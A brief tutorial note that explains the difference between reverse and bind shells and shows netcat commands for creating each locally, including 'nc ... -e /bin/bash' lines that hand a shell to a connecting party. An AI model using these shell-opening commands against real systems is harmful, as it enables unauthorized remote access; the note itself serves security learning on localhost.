# Reverse shell vs. bind shell

A reverse shell is when a victim machine connects to us (attacker), and gives us shell access,
while a bind shell is when we (attacker) connect to a machine (victim) that gives us shell access.

In both instances the victim gives us access to the shell, the difference is who
listens and who connects.

## Creating them locally

Reverse shell with bash:

```bash
nc -nvlp 4444 # in attacker terminal
nc localhost 4444 -e /bin/bash # in victim terminal
```

Bind shell with bash:

```bash
nc localhost 4444
nc -nvlp 4444 -e /bin/bash
```
